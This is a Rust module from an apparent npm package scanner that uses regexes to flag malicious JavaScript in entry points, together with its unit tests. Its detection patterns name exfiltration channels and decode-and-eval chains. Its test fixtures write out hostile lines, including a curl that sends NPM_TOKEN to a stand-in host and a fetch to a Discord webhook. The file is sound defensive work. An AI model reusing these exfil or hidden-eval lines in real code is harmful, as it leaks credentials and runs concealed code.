//! P0 rule set #2: static patterns in the package's JS source.
//!
//! Lifecycle-script rules (P0 #1) catch the install-time exfil shape.
//! This rule catches packages whose lifecycle scripts look clean but
//! whose *importable* code is malicious — e.g. a `require('lodash-evil')`
//! that decodes a base64 payload on first import.
//!
//! Scope is narrow on purpose: we only scan the package's declared
//! entry points (`main`, `module`, `bin`, string leaves under
//! `exports`). That keeps the false-positive rate manageable (we don't
//! scan transitive bundled assets), while still hitting the surface
//! that's actually exposed to importers.

use regex::Regex;
use serde_json::Value;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use super::report::{Finding, Severity};
use super::ScannedPackage;

/// Cap on file size we'll scan — beyond this we assume the file is a
/// bundled/minified artifact whose contents will set off too many
/// false positives. Real entry points are essentially never this big.
const MAX_FILE_BYTES: u64 = 512 * 1024;

fn rules() -> &'static [(&'static str, &'static Regex, &'static str)] {
    static RULES: OnceLock<Vec<(&'static str, &'static Regex, &'static str)>> = OnceLock::new();
    RULES.get_or_init(|| {
        let raw: &[(&str, &str, &str)] = &[
            (
                "src-eval-atob",
                r"(?i)\b(eval|new\s+Function|Function)\s*\([^)]{0,200}\batob\s*\(",
                "eval/Function combined with atob (decode-and-eval chain)",
            ),
            (
                "src-eval-buffer-base64",
                r#"(?i)\b(eval|new\s+Function|Function)\s*\([^)]{0,400}Buffer\.from\s*\([^)]{0,80}["']base64"#,
                "eval/Function combined with Buffer.from(…,'base64') (decode-and-eval chain)",
            ),
            (
                "src-hardcoded-discord-webhook",
                r"(?i)discord(app)?\.com/api/webhooks/",
                "Discord webhook URL hardcoded in package source (exfil channel)",
            ),
            (
                "src-hardcoded-telegram-bot",
                r"(?i)api\.telegram\.org/bot",
                "Telegram bot API URL hardcoded in package source (exfil channel)",
            ),
            (
                "src-hardcoded-collaborator",
                r"(?i)burpcollaborator\.net|oast\.(pro|me|fun|live|site)|interactsh",
                "out-of-band collaborator domain hardcoded in package source",
            ),
            (
                "src-child-process-token-exfil",
                r"(?i)child_process[^;]{0,200}(exec|spawn)(Sync)?\s*\([^)]{0,300}process\.env\.[A-Z_]*(TOKEN|SECRET|KEY|PASSWORD|API_?KEY|ACCESS)",
                "child_process exec/spawn whose argument reads a secret-like env var",
            ),
        ];
        let mut v: Vec<(&'static str, &'static Regex, &'static str)> = Vec::new();
        for (id, pat, msg) in raw {
            let r = Regex::new(pat).expect("hardcoded scanner regex compiles");
            v.push((id, Box::leak(Box::new(r)), msg));
        }
        v
    })
}

pub fn check(pkg: &ScannedPackage) -> Vec<Finding> {
    let mut findings = Vec::new();
    for entry in collect_entry_files(pkg) {
        let meta = match fs::metadata(&entry) {
            Ok(m) => m,
            Err(_) => continue,
        };
        if meta.len() > MAX_FILE_BYTES {
            continue;
        }
        let content = match fs::read_to_string(&entry) {
            Ok(c) => c,
            Err(_) => continue,
        };
        for (rule_id, regex, message) in rules() {
            if regex.is_match(&content) {
                findings.push(Finding {
                    package: format!("{}@{}", pkg.name, pkg.version),
                    package_path: pkg.dir.display().to_string(),
                    severity: Severity::P0,
                    rule: (*rule_id).to_string(),
                    message: (*message).to_string(),
                    location: Some(
                        entry
                            .strip_prefix(&pkg.dir)
                            .map(|p| p.display().to_string())
                            .unwrap_or_else(|_| entry.display().to_string()),
                    ),
                    overridden: false,
                });
            }
        }
    }
    findings
}

/// Collect the JS files we'll scan for one package: the manifest's
/// declared entry points + `bin` scripts + every string leaf under
/// `exports`. Resolves Node's extension-completion (`./lib/index` →
/// `./lib/index.js`) and dedupes.
fn collect_entry_files(pkg: &ScannedPackage) -> Vec<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();

    let main = pkg
        .manifest
        .get("main")
        .and_then(|v| v.as_str())
        .unwrap_or("index.js");
    candidates.push(pkg.dir.join(main));

    if let Some(m) = pkg.manifest.get("module").and_then(|v| v.as_str()) {
        candidates.push(pkg.dir.join(m));
    }

    if let Some(bin) = pkg.manifest.get("bin") {
        match bin {
            Value::String(s) => candidates.push(pkg.dir.join(s)),
            Value::Object(map) => {
                for v in map.values() {
                    if let Some(s) = v.as_str() {
                        candidates.push(pkg.dir.join(s));
                    }
                }
            }
            _ => {}
        }
    }

    if let Some(exports) = pkg.manifest.get("exports") {
        collect_exports_paths(exports, &pkg.dir, &mut candidates);
    }

    let mut resolved = Vec::new();
    for cand in candidates {
        if let Some(r) = resolve_entry(&cand) {
            if !resolved.contains(&r) {
                resolved.push(r);
            }
        }
    }
    resolved
}

fn resolve_entry(path: &Path) -> Option<PathBuf> {
    // Try as-is, then extension completion, then index resolution
    // (mirrors Node's CommonJS file-resolution algorithm, lite).
    if path.is_file() {
        return Some(path.to_path_buf());
    }
    for ext in &["js", "mjs", "cjs"] {
        let with_ext = path.with_extension(ext);
        if with_ext.is_file() {
            return Some(with_ext);
        }
    }
    if path.is_dir() {
        for fname in &["index.js", "index.mjs", "index.cjs"] {
            let p = path.join(fname);
            if p.is_file() {
                return Some(p);
            }
        }
    }
    None
}

fn collect_exports_paths(value: &Value, base: &Path, out: &mut Vec<PathBuf>) {
    match value {
        Value::String(s) if s.starts_with("./") => {
            out.push(base.join(s));
        }
        Value::Object(map) => {
            for v in map.values() {
                collect_exports_paths(v, base, out);
            }
        }
        Value::Array(items) => {
            for v in items {
                collect_exports_paths(v, base, out);
            }
        }
        _ => {}
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use tempfile::TempDir;

    fn make_pkg(
        td: &TempDir,
        manifest: serde_json::Value,
        files: &[(&str, &str)],
    ) -> ScannedPackage {
        let dir = td.path().to_path_buf();
        fs::write(dir.join("package.json"), manifest.to_string()).unwrap();
        for (name, body) in files {
            let full = dir.join(name);
            if let Some(parent) = full.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(full, body).unwrap();
        }
        ScannedPackage {
            name: manifest["name"].as_str().unwrap_or("test").into(),
            version: manifest["version"].as_str().unwrap_or("0").into(),
            dir,
            manifest,
        }
    }

    #[test]
    fn flags_eval_atob_in_main() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({"name":"evil","version":"1","main":"index.js"}),
            &[(
                "index.js",
                "module.exports = eval(atob('Y29uc29sZS5sb2coMSk='))",
            )],
        );
        let f = check(&p);
        assert!(f.iter().any(|f| f.rule == "src-eval-atob"));
    }

    #[test]
    fn flags_buffer_from_base64_eval() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({"name":"evil","version":"1","main":"index.js"}),
            &[(
                "index.js",
                "new Function(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())()",
            )],
        );
        assert!(check(&p).iter().any(|f| f.rule == "src-eval-buffer-base64"));
    }

    #[test]
    fn flags_discord_webhook_in_exports() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({
                "name":"evil","version":"1",
                "exports": {".": "./lib/main.js"}
            }),
            &[(
                "lib/main.js",
                "fetch('https://discord.com/api/webhooks/123/abc')",
            )],
        );
        assert!(check(&p)
            .iter()
            .any(|f| f.rule == "src-hardcoded-discord-webhook"));
    }

    #[test]
    fn flags_bin_script() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({
                "name":"evil","version":"1",
                "bin": {"e": "./bin/run.js"}
            }),
            &[(
                "bin/run.js",
                "require('child_process').exec(`curl evil?t=${process.env.NPM_TOKEN}`)",
            )],
        );
        let rules: Vec<_> = check(&p).into_iter().map(|f| f.rule).collect();
        assert!(rules.contains(&"src-child-process-token-exfil".to_string()));
    }

    #[test]
    fn resolves_main_without_extension() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({"name":"e","version":"1","main":"./lib/index"}),
            &[("lib/index.js", "eval(atob('x'))")],
        );
        assert!(check(&p).iter().any(|f| f.rule == "src-eval-atob"));
    }

    #[test]
    fn resolves_main_pointing_at_dir() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({"name":"e","version":"1","main":"./lib"}),
            &[("lib/index.js", "eval(atob('x'))")],
        );
        assert!(check(&p).iter().any(|f| f.rule == "src-eval-atob"));
    }

    #[test]
    fn skips_oversized_files() {
        let td = TempDir::new().unwrap();
        let big = "a".repeat((MAX_FILE_BYTES as usize) + 1) + "\neval(atob('x'))";
        let p = make_pkg(
            &td,
            json!({"name":"big","version":"1","main":"bundle.js"}),
            &[("bundle.js", big.as_str())],
        );
        assert!(check(&p).is_empty());
    }

    #[test]
    fn clean_source_no_findings() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({"name":"good","version":"1","main":"index.js"}),
            &[("index.js", "module.exports = function add(a,b){return a+b}")],
        );
        assert!(check(&p).is_empty());
    }

    #[test]
    fn missing_entry_silently_ignored() {
        let td = TempDir::new().unwrap();
        let p = make_pkg(
            &td,
            json!({"name":"e","version":"1","main":"does-not-exist.js"}),
            &[],
        );
        assert!(check(&p).is_empty());
    }
}
